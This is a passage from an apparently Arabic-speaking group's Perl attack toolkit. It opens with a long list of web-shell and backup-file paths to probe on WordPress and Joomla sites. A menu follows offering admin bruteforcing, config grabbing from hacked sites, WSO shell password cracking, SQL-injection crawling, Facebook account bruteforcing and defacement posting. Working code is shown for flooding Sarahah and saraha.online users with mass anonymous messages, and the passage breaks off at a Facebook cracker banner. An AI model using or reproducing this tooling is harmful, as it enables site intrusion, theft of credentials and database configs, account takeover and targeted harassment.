,'wp-content/plugins/akismet/tmp/xd.php','wp-content/plugins/akismet/sym/root/home/','wp-content/plugins/akismet/billing/killer.php','wp-content/plugins/akismet/tmp/upload.php','wp-content/plugins/akismet/tmp/admin.php','wp-content/plugins/akismet/Server.php','wp-content/plugins/akismet/tmp/uploads.php','wp-content/plugins/akismet/tmp/up.php',
'wp-content/plugins/akismet/Server/','wp-content/plugins/akismet/wp-admin/c99.php','wp-content/plugins/akismet/tmp/priv8.php','wp-content/plugins/akismet/priv8.php','wp-content/plugins/akismet/cgi.pl/','wp-content/plugins/akismet/tmp/cgi.pl','wp-content/plugins/akismet/downloads/dom.php','wp-content/plugins/akismet/webadmin.html','wp-content/plugins/akismet/admins.php','wp-content/plugins/akismet/bluff.php','wp-content/plugins/akismet/king.jeen'
,'wp-content/plugins/akismet/admins/','wp-content/plugins/akismet/admins.asp','wp-content/plugins/akismet/admins.php','wp-content/plugins/akismet/wp.zip','wp-content/plugins/akismet/disqus.php','wp-content/plugins/google-sitemap-generator/cpanel','wp-content/plugins/google-sitemap-generator/awstats','wp-content/plugins/google-sitemap-generator/site.sql','wp-content/plugins/google-sitemap-generator/vb.sql','wp-content/plugins/google-sitemap-generator/forum.sql'
,'wp-content/plugins/google-sitemap-generator/r00t-s3c.php','wp-content/plugins/google-sitemap-generator/c.php','wp-content/plugins/google-sitemap-generator/backup.sql','wp-content/plugins/google-sitemap-generator/back.sql','wp-content/plugins/google-sitemap-generator/data.sql','wp-content/plugins/google-sitemap-generator/wp.rar/','wp-content/plugins/google-sitemap-generator/asp.aspx','wp-content/plugins/google-sitemap-generator/tmp/vaga.php','wp-content/plugins/google-sitemap-generator/tmp/killer.php',
'wp-content/plugins/google-sitemap-generator/whmcs.php','wp-content/plugins/google-sitemap-generator/abuhlail.php','wp-content/plugins/google-sitemap-generator/tmp/killer.php','wp-content/plugins/google-sitemap-generator/tmp/domaine.pl','wp-content/plugins/google-sitemap-generator/tmp/domaine.php','wp-content/plugins/google-sitemap-generator/useradmin/','wp-content/plugins/google-sitemap-generator/tmp/d0maine.php','wp-content/plugins/google-sitemap-generator/d0maine.php',
'wp-content/plugins/google-sitemap-generator/tmp/sql.php','wp-content/plugins/google-sitemap-generator/X.php','wp-content/plugins/google-sitemap-generator/123.php','wp-content/plugins/google-sitemap-generator/m.php','wp-content/plugins/google-sitemap-generator/b.php','wp-content/plugins/google-sitemap-generator/up.php','wp-content/plugins/google-sitemap-generator/tmp/dz1.php','wp-content/plugins/google-sitemap-generator/dz1.php','wp-content/plugins/google-sitemap-generator/forum.zip'
,'wp-content/plugins/google-sitemap-generator/Symlink.php','wp-content/plugins/google-sitemap-generator/Symlink.pl','wp-content/plugins/google-sitemap-generator/forum.rar','wp-content/plugins/google-sitemap-generator/joomla.zip','wp-content/plugins/google-sitemap-generator/joomla.rar','wp-content/plugins/google-sitemap-generator/wp.php','wp-content/plugins/google-sitemap-generator/buck.sql','wp-content/plugins/google-sitemap-generator/sysadmin.php','wp-content/plugins/google-sitemap-generator/images/c99.php'
,'wp-content/plugins/google-sitemap-generator/xd.php','wp-content/plugins/google-sitemap-generator/c100.php','wp-content/plugins/google-sitemap-generator/spy.aspx','wp-content/plugins/google-sitemap-generator/xd.php','wp-content/plugins/google-sitemap-generator/tmp/xd.php','wp-content/plugins/google-sitemap-generator/sym/root/home/','wp-content/plugins/google-sitemap-generator/billing/killer.php','wp-content/plugins/google-sitemap-generator/tmp/upload.php','wp-content/plugins/google-sitemap-generator/tmp/admin.php','wp-content/plugins/google-sitemap-generator/Server.php','wp-content/plugins/google-sitemap-generator/tmp/uploads.php','wp-content/plugins/google-sitemap-generator/tmp/up.php',
'wp-content/plugins/google-sitemap-generator/Server/','wp-content/plugins/google-sitemap-generator/wp-admin/c99.php','wp-content/plugins/google-sitemap-generator/tmp/priv8.php','wp-content/plugins/google-sitemap-generator/priv8.php','wp-content/plugins/google-sitemap-generator/cgi.pl/','wp-content/plugins/google-sitemap-generator/tmp/cgi.pl','wp-content/plugins/google-sitemap-generator/downloads/dom.php','wp-content/plugins/google-sitemap-generator/webadmin.html'
,'wp-content/plugins/google-sitemap-generator/admins.php','wp-content/plugins/google-sitemap-generator/bluff.php','wp-content/plugins/google-sitemap-generator/king.jeen','wp-content/plugins/google-sitemap-generator/admins/','wp-content/plugins/google-sitemap-generator/admins.asp','wp-content/plugins/google-sitemap-generator/admins.php','wp-content/plugins/google-sitemap-generator/wp.zip','wp-content/plugins/google-sitemap-generator/sitemap-core.php','/templates/beez/WSO.php'
,'/templates/beez/dz.php','/templates/beez/DZ.php','/templates/beez/cpanel.php','/templates/beez/cpn.php','/templates/beez/sos.php','/templates/beez/term.php','/templates/beez/Sec-War.php','/templates/beez/sql.php','/templates/beez/ssl.php','/templates/beez/mysql.php','/templates/beez/WolF.php','/templates/beez/madspot.php','/templates/beez/Cgishell.pl','/templates/beez/killer.php','/templates/beez/changeall.php','/templates/beez/2.php','/templates/beez/Sh3ll.php','/templates/beez/dz0.php',
'/templates/beez/dam.php','/templates/beez/user.php','/templates/beez/dom.php','/templates/beez/whmcs.php','/templates/beez/vb.zip','/templates/beez/r00t.php','/templates/beez/c99.php','/templates/beez/gaza.php','/templates/beez/1.php','/templates/beez/d0mains.php','/templates/beez/madspotshell.php','/templates/beez/info.php','/templates/beez/egyshell.php','/templates/beez/Sym.php','/templates/beez/c22.php','/templates/beez/c100.php','/templates/beez/configuration.php','/templates/beez/g.php',
'/templates/beez/xx.pl','/templates/beez/ls.php','/templates/beez/Cpanel.php','/templates/beez/k.php','/templates/beez/zone-h.php','/templates/beez/tmp/user.php','/templates/beez/tmp/Sym.php','/templates/beez/cp.php','/templates/beez/tmp/madspotshell.php','/templates/beez/tmp/root.php','/templates/beez/tmp/whmcs.php','/templates/beez/tmp/index.php','/templates/beez/tmp/2.php','/templates/beez/tmp/dz.php','/templates/beez/tmp/cpn.php',
'/templates/beez/tmp/changeall.php','/templates/beez/tmp/Cgishell.pl','/templates/beez/tmp/sql.php','/templates/beez/0day.php','/templates/beez/tmp/admin.php','/templates/beez/L3b.php','/templates/beez/d.php','/templates/beez/tmp/d.php','/templates/beez/tmp/L3b.php','/templates/beez/sado.php','/templates/beez/admin1.php','/templates/beez/upload.php','/templates/beez/up.php','/templates/beez/vb.zip','/templates/beez/vb.rar','/templates/beez/admin2.asp',
'/templates/beez/uploads.php','/templates/beez/sa.php','/templates/beez/sysadmins/','/templates/beez/admin1/','/templates/beez/sniper.php','/templates/beez/images/Sym.php','/templates/beez/r57.php','/templates/beez/gzaa_spysl','/templates/beez/sql-new.php','/templates/beez/shell.php','/templates/beez/sa.php','/templates/beez/admin.php','/templates/beez/sa2.php','/templates/beez/2.php','/templates/beez/gaza.php','/templates/beez/up.php','/templates/beez/upload.php',
'/templates/beez/uploads.php','/templates/beez/shell.php','/templates/beez/amad.php','/templates/beez/t00.php','/templates/beez/dz.php','/templates/beez/site.rar','/templates/beez/Black.php','/templates/beez/site.tar.gz','/templates/beez/home.zip','/templates/beez/home.rar','/templates/beez/home.tar','/templates/beez/home.tar.gz','/templates/beez/forum.zip','/templates/beez/forum.rar','/templates/beez/forum.tar','/templates/beez/forum.tar.gz','/templates/beez/test.txt','/templates/beez/ftp.txt',
'/templates/beez/user.txt','/templates/beez/site.txt','/templates/beez/error_log','/templates/beez/error','/templates/beez/cpanel','/templates/beez/awstats','/templates/beez/site.sql','/templates/beez/vb.sql','/templates/beez/forum.sql','/templates/beez/r00t-s3c.php','/templates/beez/c.php','/templates/beez/backup.sql','/templates/beez/back.sql','/templates/beez/data.sql','/templates/beez/wp.rar/','/templates/beez/asp.aspx','/templates/beez/tmp/vaga.php',
'/templates/beez/tmp/killer.php','/templates/beez/whmcs.php','/templates/beez/abuhlail.php','/templates/beez/tmp/killer.php','/templates/beez/tmp/domaine.pl','/templates/beez/tmp/domaine.php','/templates/beez/useradmin/','/templates/beez/tmp/d0maine.php','/templates/beez/d0maine.php','/templates/beez/tmp/sql.php','/templates/beez/X.php','/templates/beez/123.php','/templates/beez/m.php','/templates/beez/b.php','/templates/beez/up.php',
'/templates/beez/tmp/dz1.php','/templates/beez/dz1.php','/templates/beez/forum.zip','/templates/beez/Symlink.php','/templates/beez/Symlink.pl','/templates/beez/forum.rar','/templates/beez/joomla.zip','/templates/beez/joomla.rar','/templates/beez/wp.php','/templates/beez/buck.sql','/templates/beez/sysadmin.php','/templates/beez/images/c99.php','/templates/beez/xd.php','/templates/beez/c100.php','/templates/beez/spy.aspx','/templates/beez/xd.php',
'/templates/beez/tmp/xd.php','/templates/beez/sym/root/home/','/templates/beez/billing/killer.php','/templates/beez/tmp/upload.php','/templates/beez/tmp/admin.php','/templates/beez/Server.php','/templates/beez/tmp/uploads.php','/templates/beez/tmp/up.php','/templates/beez/Server/','/templates/beez/wp-admin/c99.php','/templates/beez/tmp/priv8.php','/templates/beez/priv8.php','/templates/beez/cgi.pl/','/templates/beez/tmp/cgi.pl','/templates/beez/downloads/dom.php',
'/templates/beez/webadmin.html','/templates/beez/admins.php','/templates/beez/bluff.php','/templates/beez/king.jeen','/templates/beez/admins/','/templates/beez/admins.asp','/templates/beez/admins.php','/templates/beez/wp.zip','/templates/beez/index.php/images/WSO.php','/images/dz.php','/images/DZ.php','/images/cpanel.php','/images/cpn.php','/images/sos.php','/images/term.php','/images/Sec-War.php','/images/sql.php','/images/ssl.php','/images/mysql.php','/images/WolF.php','/images/madspot.php','/images/Cgishell.pl',
'/images/killer.php','/images/changeall.php','/images/2.php','/images/Sh3ll.php','/images/dz0.php','/images/dam.php','/images/user.php','/images/dom.php','/images/whmcs.php','/images/vb.zip','/images/r00t.php','/images/c99.php','/images/gaza.php','/images/1.php','/images/d0mains.php','/images/madspotshell.php','/images/info.php','/images/egyshell.php','/images/Sym.php','/images/c22.php','/images/c100.php','/images/configuration.php','/images/g.php',
'/images/xx.pl','/images/ls.php','/images/Cpanel.php','/images/k.php','/images/zone-h.php','/images/tmp/user.php','/images/tmp/Sym.php','/images/cp.php','/images/tmp/madspotshell.php','/images/tmp/root.php','/images/tmp/whmcs.php','/images/tmp/index.php','/images/tmp/2.php','/images/tmp/dz.php','/images/tmp/cpn.php','/images/tmp/changeall.php','/images/tmp/Cgishell.pl','/images/tmp/sql.php','/images/0day.php','/images/tmp/admin.php','/images/L3b.php'
,'/images/d.php','/images/tmp/d.php','/images/tmp/L3b.php','/images/sado.php','/images/admin1.php','/images/upload.php','/images/up.php','/images/vb.zip','/images/vb.rar','/images/admin2.asp','/images/uploads.php','/images/sa.php','/images/sysadmins/','/images/admin1/','/images/sniper.php','/images/images/Sym.php','/images/r57.php','/images/gzaa_spysl','/images/sql-new.php','/images/shell.php','/images/sa.php','/images/admin.php','/images/sa2.php','/images/2.php',
'/images/gaza.php','/images/up.php','/images/upload.php','/images/uploads.php','/images/shell.php','/images/amad.php','/images/t00.php','/images/dz.php','/images/site.rar','/images/Black.php','/images/site.tar.gz','/images/home.zip','/images/home.rar','/images/home.tar','/images/home.tar.gz','/images/forum.zip','/images/forum.rar','/images/forum.tar','/images/forum.tar.gz','/images/test.txt','/images/ftp.txt','/images/user.txt','/images/site.txt',
'/images/error_log','/images/error','/images/cpanel','/images/awstats','/images/site.sql','/images/vb.sql','/images/forum.sql','/images/r00t-s3c.php','/images/c.php','/images/backup.sql','/images/back.sql','/images/data.sql','/images/wp.rar/','/images/asp.aspx','/images/tmp/vaga.php','/images/tmp/killer.php','/images/whmcs.php','/images/abuhlail.php','/images/tmp/killer.php','/images/tmp/domaine.pl','/images/tmp/domaine.php','/images/useradmin/',
'/images/tmp/d0maine.php','/images/d0maine.php','/images/tmp/sql.php','/images/X.php','/images/123.php','/images/m.php','/images/b.php','/images/up.php','/images/tmp/dz1.php','/images/dz1.php','/images/forum.zip','/images/Symlink.php','/images/Symlink.pl','/images/forum.rar','/images/joomla.zip','/images/joomla.rar','/images/wp.php','/images/buck.sql','/includes/WSO.php','/includes/dz.php','/includes/DZ.php','/includes/cpanel.php','/includes/cpn.php',
'/includes/sos.php','/includes/term.php','/includes/Sec-War.php','/includes/sql.php','/includes/ssl.php','/includes/mysql.php','/includes/WolF.php','/includes/madspot.php','/includes/Cgishell.pl','/includes/killer.php','/includes/changeall.php','/includes/2.php','/includes/Sh3ll.php','/includes/dz0.php','/includes/dam.php','/includes/user.php','/includes/dom.php','/includes/whmcs.php','/includes/vb.zip','/includes/r00t.php','/includes/c99.php',
'/includes/gaza.php','/includes/1.php','/includes/d0mains.php','/includes/madspotshell.php','/includes/info.php','/includes/egyshell.php','/includes/Sym.php','/includes/c22.php','/includes/c100.php','/includes/configuration.php','/includes/g.php','/includes/xx.pl','/includes/ls.php','/includes/Cpanel.php','/includes/k.php','/includes/zone-h.php','/includes/tmp/user.php','/includes/tmp/Sym.php','/includes/cp.php','/includes/tmp/madspotshell.php',
'/includes/tmp/root.php','/includes/tmp/whmcs.php','/includes/tmp/index.php','/includes/tmp/2.php','/includes/tmp/dz.php','/includes/tmp/cpn.php','/includes/tmp/changeall.php','/includes/tmp/Cgishell.pl','/includes/tmp/sql.php','/includes/0day.php','/includes/tmp/admin.php','/includes/L3b.php','/includes/d.php','/includes/tmp/d.php','/includes/tmp/L3b.php','/includes/sado.php','/includes/admin1.php','/includes/upload.php','/includes/up.php','/includes/vb.zip',
'/includes/vb.rar','/includes/admin2.asp','/includes/uploads.php','/includes/sa.php','/includes/sysadmins/','/includes/admin1/','/includes/sniper.php',
'/includes/images/Sym.php','/includes/r57.php','/includes/gzaa_spysl','/includes/sql-new.php','/includes/shell.php','/includes/sa.php','/includes/admin.php','/includes/sa2.php','/includes/2.php','/includes/gaza.php','/includes/up.php','/includes/upload.php','/includes/uploads.php','/includes/shell.php','/includes/amad.php','/includes/t00.php','/includes/dz.php','/includes/site.rar','/includes/Black.php','/includes/site.tar.gz','/includes/home.zip',
'/includes/home.rar','/includes/home.tar','/includes/home.tar.gz','/includes/forum.zip','/includes/forum.rar','/includes/forum.tar','/includes/forum.tar.gz','/includes/test.txt','/includes/ftp.txt','/includes/user.txt','/includes/site.txt','/includes/error_log','/includes/error','/includes/cpanel','/includes/awstats','/includes/site.sql','/includes/vb.sql','/includes/forum.sql','/includes/r00t-s3c.php','/includes/c.php','/includes/backup.sql',
'/includes/back.sql','/includes/data.sql','/includes/wp.rar/','/includes/asp.aspx','/includes/tmp/vaga.php','/includes/tmp/killer.php','/includes/whmcs.php','/includes/abuhlail.php','/includes/tmp/killer.php','/includes/tmp/domaine.pl','/includes/tmp/domaine.php','/includes/useradmin/','/includes/tmp/d0maine.php','/includes/d0maine.php','/includes/tmp/sql.php','/includes/X.php','/includes/123.php','/includes/m.php','/includes/b.php','/includes/up.php','/includes/tmp/dz1.php'
,'/includes/dz1.php','/includes/forum.zip','/includes/Symlink.php','/includes/Symlink.pl','/includes/forum.rar',
'/includes/joomla.zip','/includes/joomla.rar','/includes/wp.php','/includes/buck.sql','/includes/sysadmin.php','/includes/images/c99.php','/includes/xd.php','/includes/c100.php','/includes/spy.aspx','/includes/xd.php','/includes/tmp/xd.php','/includes/sym/root/home/','/includes/billing/killer.php','/includes/tmp/upload.php','/includes/tmp/admin.php','/includes/Server.php','/includes/tmp/uploads.php','/includes/tmp/up.php','/includes/Server/'
,'/includes/wp-admin/c99.php','/includes/tmp/priv8.php','/includes/priv8.php','/includes/cgi.pl/','/includes/tmp/cgi.pl','/includes/downloads/dom.php','/includes/webadmin.html','/includes/admins.php','/includes/bluff.php','/includes/king.jeen','/includes/admins/','/includes/admins.asp','/includes/admins.php','/includes/wp.zip','/includes/','/templates/rhuk_milkyway/WSO.php','/templates/rhuk_milkyway/dz.php','/templates/rhuk_milkyway/DZ.php',
'/templates/rhuk_milkyway/cpanel.php','/templates/rhuk_milkyway/cpn.php','/templates/rhuk_milkyway/sos.php','/templates/rhuk_milkyway/term.php','/templates/rhuk_milkyway/Sec-War.php','/templates/rhuk_milkyway/sql.php','/templates/rhuk_milkyway/ssl.php','/templates/rhuk_milkyway/mysql.php','/templates/rhuk_milkyway/WolF.php','/templates/rhuk_milkyway/madspot.php','/templates/rhuk_milkyway/Cgishell.pl','/templates/rhuk_milkyway/killer.php','/templates/rhuk_milkyway/changeall.php',
'/templates/rhuk_milkyway/2.php','/templates/rhuk_milkyway/Sh3ll.php','/templates/rhuk_milkyway/dz0.php','/templates/rhuk_milkyway/dam.php','/templates/rhuk_milkyway/user.php','/templates/rhuk_milkyway/dom.php','/templates/rhuk_milkyway/whmcs.php','/templates/rhuk_milkyway/vb.zip','/templates/rhuk_milkyway/r00t.php','/templates/rhuk_milkyway/c99.php','/templates/rhuk_milkyway/gaza.php','/templates/rhuk_milkyway/1.php','/templates/rhuk_milkyway/d0mains.php','/templates/rhuk_milkyway/madspotshell.php','/templates/rhuk_milkyway/info.php','/templates/rhuk_milkyway/egyshell.php','/templates/rhuk_milkyway/Sym.php','/templates/rhuk_milkyway/c22.php',
'/templates/rhuk_milkyway/c100.php','/templates/rhuk_milkyway/configuration.php','/templates/rhuk_milkyway/g.php','/templates/rhuk_milkyway/xx.pl','/templates/rhuk_milkyway/ls.php','/templates/rhuk_milkyway/Cpanel.php','/templates/rhuk_milkyway/k.php','/templates/rhuk_milkyway/zone-h.php','/templates/rhuk_milkyway/tmp/user.php','/templates/rhuk_milkyway/tmp/Sym.php','/templates/rhuk_milkyway/cp.php','/templates/rhuk_milkyway/tmp/madspotshell.php',
'/templates/rhuk_milkyway/tmp/root.php','/templates/rhuk_milkyway/tmp/whmcs.php','/templates/rhuk_milkyway/tmp/index.php','/templates/rhuk_milkyway/tmp/2.php','/templates/rhuk_milkyway/tmp/dz.php','/templates/rhuk_milkyway/tmp/cpn.php','/templates/rhuk_milkyway/tmp/changeall.php','/templates/rhuk_milkyway/tmp/Cgishell.pl','/templates/rhuk_milkyway/tmp/sql.php','/templates/rhuk_milkyway/0day.php','/templates/rhuk_milkyway/tmp/admin.php','/templates/rhuk_milkyway/L3b.php',
'/templates/rhuk_milkyway/d.php','/templates/rhuk_milkyway/tmp/d.php','/templates/rhuk_milkyway/tmp/L3b.php','/templates/rhuk_milkyway/sado.php','/templates/rhuk_milkyway/admin1.php','/templates/rhuk_milkyway/upload.php','/templates/rhuk_milkyway/up.php','/templates/rhuk_milkyway/vb.zip','/templates/rhuk_milkyway/vb.rar','/templates/rhuk_milkyway/admin2.asp','/templates/rhuk_milkyway/uploads.php','/templates/rhuk_milkyway/sa.php','/templates/rhuk_milkyway/sysadmins/',
'/templates/rhuk_milkyway/admin1/','/templates/rhuk_milkyway/sniper.php','/templates/rhuk_milkyway/images/Sym.php','/templates/rhuk_milkyway/r57.php','/templates/rhuk_milkyway/gzaa_spysl','/templates/rhuk_milkyway/sql-new.php','/templates/rhuk_milkyway/shell.php','/templates/rhuk_milkyway/sa.php','/templates/rhuk_milkyway/admin.php','/templates/rhuk_milkyway/sa2.php','/templates/rhuk_milkyway/2.php','/templates/rhuk_milkyway/gaza.php','/templates/rhuk_milkyway/up.php','/templates/rhuk_milkyway/upload.php','/templates/rhuk_milkyway/uploads.php','/templates/rhuk_milkyway/shell.php','/templates/rhuk_milkyway/amad.php','/templates/rhuk_milkyway/t00.php','/templates/rhuk_milkyway/dz.php','/templates/rhuk_milkyway/site.rar','/templates/rhuk_milkyway/Black.php','/templates/rhuk_milkyway/site.tar.gz','/templates/rhuk_milkyway/home.zip','/templates/rhuk_milkyway/home.rar','/templates/rhuk_milkyway/home.tar','/templates/rhuk_milkyway/home.tar.gz','/templates/rhuk_milkyway/forum.zip','/templates/rhuk_milkyway/forum.rar','/templates/rhuk_milkyway/forum.tar','/templates/rhuk_milkyway/forum.tar.gz','/templates/rhuk_milkyway/test.txt',
'/templates/rhuk_milkyway/ftp.txt','/templates/rhuk_milkyway/user.txt','/templates/rhuk_milkyway/site.txt','/templates/rhuk_milkyway/error_log','/templates/rhuk_milkyway/error','/templates/rhuk_milkyway/cpanel','/templates/rhuk_milkyway/awstats','/templates/rhuk_milkyway/site.sql','/templates/rhuk_milkyway/vb.sql','/templates/rhuk_milkyway/forum.sql','/templates/rhuk_milkyway/r00t-s3c.php','/templates/rhuk_milkyway/c.php','/templates/rhuk_milkyway/backup.sql'
,'/templates/rhuk_milkyway/back.sql','/templates/rhuk_milkyway/data.sql','/templates/rhuk_milkyway/wp.rar/','/templates/rhuk_milkyway/asp.aspx','/templates/rhuk_milkyway/tmp/vaga.php','/templates/rhuk_milkyway/tmp/killer.php','/templates/rhuk_milkyway/whmcs.php','/templates/rhuk_milkyway/abuhlail.php','/templates/rhuk_milkyway/tmp/killer.php','/templates/rhuk_milkyway/tmp/domaine.pl','/templates/rhuk_milkyway/tmp/domaine.php','/templates/rhuk_milkyway/useradmin/',
'/templates/rhuk_milkyway/tmp/d0maine.php','/templates/rhuk_milkyway/d0maine.php','/templates/rhuk_milkyway/tmp/sql.php','/templates/rhuk_milkyway/X.php','/templates/rhuk_milkyway/123.php','/templates/rhuk_milkyway/m.php','/templates/rhuk_milkyway/b.php','/templates/rhuk_milkyway/up.php','/templates/rhuk_milkyway/tmp/dz1.php','/templates/rhuk_milkyway/dz1.php','/templates/rhuk_milkyway/forum.zip','/templates/rhuk_milkyway/Symlink.php','/templates/rhuk_milkyway/Symlink.pl','/templates/rhuk_milkyway/forum.rar','/templates/rhuk_milkyway/joomla.zip','/templates/rhuk_milkyway/joomla.rar','/templates/rhuk_milkyway/wp.php','/templates/rhuk_milkyway/buck.sql','/templates/rhuk_milkyway/sysadmin.php','/templates/rhuk_milkyway/images/c99.php','/templates/rhuk_milkyway/xd.php','/templates/rhuk_milkyway/c100.php','/templates/rhuk_milkyway/spy.aspx','/templates/rhuk_milkyway/xd.php','/templates/rhuk_milkyway/tmp/xd.php','/templates/rhuk_milkyway/sym/root/home/','/templates/rhuk_milkyway/billing/killer.php','/templates/rhuk_milkyway/tmp/upload.php','/templates/rhuk_milkyway/tmp/admin.php','/templates/rhuk_milkyway/Server.php','/templates/rhuk_milkyway/tmp/uploads.php','/templates/rhuk_milkyway/tmp/up.php','/templates/rhuk_milkyway/Server/','/templates/rhuk_milkyway/wp-admin/c99.php','/templates/rhuk_milkyway/tmp/priv8.php','/templates/rhuk_milkyway/priv8.php','/templates/rhuk_milkyway/cgi.pl/','/templates/rhuk_milkyway/tmp/cgi.pl','/templates/rhuk_milkyway/downloads/dom.php','/templates/rhuk_milkyway/webadmin.html','/templates/rhuk_milkyway/admins.php','/templates/rhuk_milkyway/bluff.php','/templates/rhuk_milkyway/king.jeen',
'/templates/rhuk_milkyway/admins/','/templates/rhuk_milkyway/admins.asp','/templates/rhuk_milkyway/admins.php','/templates/rhuk_milkyway/wp.zip','/templates/rhuk_milkyway/WSO.php','a.php','z.php','e.php','r.php','t.php','y.php','u.php','i.php','o.php','p.php','q.php','s.php','d.php','f.php','g.php','h.php','j.php','k.php','l.php','m.php','w.php','x.php','c.php','v.php','b.php','n.php','1.php','2.php','3.php','4.php','5.php','6.php','7.php','8.php',
'9.php','10.php','12.php','11.php','1234.php');if (-e "logz"){}else{mkdir "logz" or die "Try To Make a dictory named 'logz' -_-";}
GetOptions('m|merlin=s'=> \$merlin) or &apapapa();
if(!defined($merlin)){&apapapa();exit();}
sub apapapa {
abt();
print "\n";
print q(~>  Usage python esp.pl -m <num>
1 Adminfinder+Bruter+CMSDetector           2 Config2AdminDB
3 Check Grabbed Configs(From Hacked Sites) 4 Mirror-h Grabber
5 Config Finder With pshell                6 Bing Dorker With Dorks's list
7 Zone/Mirror-h Poster                     8 WSO ShellPass Bruter
9 Config Grabber(email/smtp/ftp/combos)    10 Sqli Crawler
11 Facebook Bruter                         12 FbBruter (email=pass)
13 Email Crawler                           14 Saraha.online Sender
15 Shell Finder                            16 Sarahah.com Sener
);exit}
if ($merlin eq '1'){
storm();
}
elsif($merlin eq '2'){
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Websites : ";
print color('bold yellow');
$list=<STDIN>;
open(tarrget,"<$list") or die "Winha wbsitelist Ya 7ej -_-\n";
Mayar:while(<tarrget>){
chomp($_);
$site = $_;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site"; }
if($site =~/https/){
$site =~ s/https/http/ig;}
Psycom();}}

elsif($merlin eq '3'){
print color('bold blue')," [";
print color('bold green'),">";
print color('bold blue'),"] ";
print color('bold red'),"Websites : ";
print color('bold yellow');
$list=<STDIN>;
open(tarrget,"<$list") or die "Winha wbsitelist Ya 7ej -_-\n";
@tart=<tarrget>;
Mayar:while(@tart){
chomp($_);
$site = $_;
print $site;
if($site !~ /https:\/\// && $site !~ /http:\/\// ) { $site = "http://$site"; }
if($site =~/https/){
$site =~ s/https/http/ig;};hackedcnf();}}
elsif($merlin eq '7'){zoneh();}
elsif($merlin eq '8'){wsosh();}
elsif($merlin eq '9'){oussama();}
elsif($merlin eq '10'){sqliii();}
elsif($merlin eq '4'){mirroh();}elsif($merlin eq '16'){sarhsu();}
elsif($merlin eq '5'){cnfgrr();}elsif($merlin eq '15'){shellomha();}
elsif($merlin eq '6'){lm3allem();}elsif($merlin eq '13'){emailn();}
elsif($merlin eq '11'){fbsmash();}elsif($merlin eq '14'){sarha();}
elsif($merlin eq '12'){fb2pass();}
else{print color('bold green'),"{";print color('bold red'),"!";print color('bold green'),"} Incorrect Choice ..Redirect To Menu";
sleep(0.69);lool();}

sub sarhsu(){
print color('bold green'); 
print q(                                                 
 _____             _       _   _____           _       
|   __|___ ___ ___| |_ ___| |_|   __|___ ___ _| |___ ___ 
|__   | .'|  _| .'|   | .'|   |__   | -_|   | . | -_|  _|
|_____|__,|_| |__,|_|_|__,|_|_|_____|___|_|_|___|___|_|  
                                            ~~ Escanor Sama ~~ .. );
print color('bold red'),"\n[";
print color('bold green'),"User";
print color('bold red'),"] "; 
$user=<>;
$chk=$usrag->get("https://$user.sarahah.com");
if ($chk->status_line=~/200|302/){
if ($chk->content=~/__RequestVerificationToken: '(.*)/){
  $tokenn=$1;
}
if ($chl->content=~/reportedUserId: '(.*)/){
print color('bold red'),"\n[";
print color('bold green'),"ID";
print color('bold red'),"] $1"; 
print color('bold red'),"\n[";
print color('bold green'),"Message";
print color('bold red'),"] "; $msg=<>;
print color('bold red'),"\n[";
print color('bold green'),"How Much";
print color('bold red'),"] "; $amnt=<>;$amnt+=0;
if ($amnt >50){
  $amnt=50;
}
$n=0;
while($n<$amnt+0){
$boom=POST "https://$user.sarahah.com/Messages/SendMessage",['__RequestVerificationToken' => $tokenn,'userId' => $id,'text' => $msg];
$reqq = $usrag->request($boom);
$n+=1;
print color('bold red'),"\n[";
print color('bold green'),"$n";
print color('bold red'),"]";
print color('bold reset')," Sheep";
}
}else{print "InValid User ..";}}
}
sub sarha(){
print color('bold green');
print q(                                                     
 _____             _       _____           _         
|   __|___ ___ ___| |_ ___|   __|___ ___ _| |___ ___ 
|__   | .'|  _| .'|   | .'|__   | -_|   | . | -_|  _|
|_____|__,|_| |__,|_|_|__,|_____|___|_|_|___|___|_|  
  );
print color('bold yellow'),"\n ~~ Escanor Sama ~~ .. ";
print color('bold red'),"\n[";
print color('bold green'),"User";
print color('bold red'),"] ";	
$user=<STDIN>;
chomp $user;
$lnkoo="http://$user.saraha.online";
$lnksnd="http://saraha.online/user/ajax_send_msg";
my $usrag = $usrag->get("$lnkoo")->status_line; 
if ($usrag =~/200|302/){
print color('bold red'),"\n[";
print color('bold green'),"Message";
print color('bold red'),"] ";	
$msg=<STDIN>;
chomp $msg;
print color('bold red'),"\n[";
print color('bold green'),"How Much";
print color('bold red'),"] ";$hmt=<>;
my $usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$idd = $usrag->get($lnkoo)->content;
if ( $idd =~ /msg: msg, id: (.*)/ ) {
$id = $1 ;
$n=0;
while ($n<$hmt+0){ 
my $usrag = LWP::UserAgent->new(keep_alive => 1);
$usrag->timeout (15);
$usrag->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$sarah = POST $lnksnd, [msg => $msg, id => $id];
$reqq = $usrag->request($sarah);
$n+=1;
print color('bold red'),"\n[";
print color('bold green'),"$n";
print color('bold red'),"]";
print color('bold reset')," Sheep";
}
}else{print color('bold red'),"Cant Find The ID...";print color('reset');}
}else{print color('bold red'),"Check User...";print color('reset');}
}
sub fb2pass {
system ("title TUNISIEN Facebook Cracker ");
if ($^O =~ /MSWin32/) {system("cls"); }else { system("clear"); }
print color('bold red'),q(
                ..:::::::::..
           ..:::aad8888888baa:::..
        .::::d:?88888888888?::8b::::.
      .:::d8888:?88888888??a888888b:::.
    .:::d8888888a8888888aa8888888888b:::.
   ::::dP::::::::88888888888::::::::Yb::::
  ::::dP:::::::::Y888888888P:::::::::Yb::::
 ::::d8:::::::::::Y8888888P:::::::::::8b::::
.::::88::::::::::::Y88888P::::::::::::88::::.
:::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
:::::::Y88888888888P::|::Y88888888888P:::::::
::::::::::::::::888:::|:::888::::::::::::::::
`:::::::::::::::8888888888888b::::::::::::::'
 :::::::::::::::88888888888888::::::::::::::
  :::::::::::::d88888888888888:::::::::::::
   ::::::::::::88::88::88:::88::::::::::::
    `::::::::::88::88::88:::88::::::::::'
      `::::::::88::88::P::::88::::::::'
        `::::::88::88:::::::88::::::'
           ``:::::::::::::::::::''
                ``:::::::::''  
  #Facebook Bruter
 # xkyuby - AronTn && Escan0r);           
print color 'bold blue';
print color 'bold blue';
print color('bold green'),"\n  [";
